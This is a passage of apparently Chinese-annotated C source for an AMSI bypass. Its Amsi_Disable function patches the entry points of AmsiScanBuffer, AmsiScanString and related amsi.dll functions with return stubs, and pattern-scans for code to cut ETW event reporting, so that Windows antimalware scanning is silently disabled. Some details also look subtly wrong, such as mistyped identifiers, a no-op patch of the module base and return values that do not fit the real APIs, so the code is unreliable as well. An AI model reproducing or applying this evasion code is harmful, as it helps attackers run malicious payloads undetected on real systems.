## 2. AMSI 卸载

```c
/* amsi_disable.c */
#include "plat.h"

typedef NTSTATUS (NTAPI *PFN_AmsiScanBuffer)(HANDLE, PVOID, ULONG, PVOID, ULONG, PULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_AmsiScanString)(HANDLE, PCWSTR, PVOID, ULONG, PVOID, PULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_AmsiInitialize)(PVOID*);
typedef NTSTATUS (NTAPI *PFN_AmsiOpenSession)(PVOID, PVOID*);
typedef NTSTATUS (NTAPI *PFN_AmsiUninitialize)(PVOID);
typedef void     (NTAPI *PFN_AmsiEtwEventReceive)(PVOID, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG);

/* AmsiScanBuffer  -> mov eax, 1 ; ret          (返回 AMDI_RESULT_SUCCESS)
 * AmsiScanString  -> mov eax, 1 ; ret
 * AmsiInitialize  -> xor eax, eax ; ret        (S_OK，阻止后续初始化)
 * AmsiOpenSession -> xor eax, eax ; ret        (避免 ETW 通道注册)
 * AmsiUninitialize-> ret
 * AmsiEtwEventReceive -> ret                   (切断 amsi -> ETW 事件回传)
 */
static const BYTE RET_1[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
static const BYTE RET_0[] = { 0x31, 0xC0, 0xC3 };
static const BYTE RET_N[] = { 0xC3 };

static void PatchOne(PVOID fn, const BYTE *b, SIZE_t n, const char *tag) {
    if (!fn) { printf("[!] %-18s : not found\n", tag); return; }
    if (WriteBytesAtomic(fn, b, n))
        printf("[+] %-18s : %p  ->  ", tag, fn);
    else { printf("[!] %-18s : write failed\n", tag); return; }
    for (SIZE_t i = 0; i < n; i++) printf("%02X ", ((BYTE*)fn)[i]);
    printf("\n");
}

BOOL Amsi_Disable(void) {
    HMODULE amsi = GetModuleHandleW(L"amsi.dll");
    if (!amsi) amsi = LoadLibraryW(L"amsi.dll");
    if (!amsi) { printf("[!] amsi.dll not loaded\n"); return FALSE; }

    /* 1) 已加载路径：直接改导出 */
    PatchOne((BYTE*)amsi + 0, NULL, 0, "noop");
    PatchOne(GetProcAddress(amsi, "AmsiScanBuffer"),   RET_1, 6, "AmsiScanBuffer");
    PatchOne(GetProcAddress(amsi, "AmsiScanString"),   RET_1, 6, "AmsiScanString");
    PatchOne(GetProcAddress(amsi, "AmsiInitialize"),   RET_0, 3, "AmsiInitialize");
    PatchOne(GetProcAddress(amsi, "AmsiOpenSession"),  RET_0, 3, "AmsiOpenSession");
    PatchOne(GetProcAddress(amsi, "AmsiUninitialize"), RET_N, 1, "AmsiUninitialize");

    /* 2) AmsiEtwEventReceive 未导出，模式定位后置 ret
     *    典型序言: 48 8B 05 ?? ?? ?? ?? 48 8B 0D ?? ?? ?? ?? 48 8B 15 ?? ?? ?? ?? ...
     *    锚定 "调用 EtwEventWrite 前压 6 参数" 的函数体首指令 */
    SIZE_t sz; BYTE *start;
    ModuleTextRange(amsi, &sz, &start);
    BYTE *etw_recv = FindPattern(start, sz,
        "48 8B 05 ?? ?? ?? ?? 48 8B 0D", "xxxxxxxxxxx");
    if (etw_recv) {
        /* 向前回溯找函数入口（最近的 CC/CC padding 之后） */
        BYTE *fn = etw_recv;
        while (fn > start && fn[-1] != 0xCC && fn[-1] != 0x90 && fn[-1] != 0xC3) fn--;
        PatchOne(fn, RET_N, 1, "AmsiEtwEventReceive");
    } else {
        printf("[~] AmsiEtwEventReceive: pattern miss (build-dependent)\n");
    }

    /* 3) AmsiUtils.dll 里的 AmsiNotification / AmsiOpenSession2 同步失效 */
    HMODULE au = GetModuleHandleW(L"AmsiUtils.dll");
    if (au) PatchOne(GetProcAddress(au, "AmsiOpenSession2"), RET_0, 3, "AmsiOpenSession2");

    return TRUE;
}
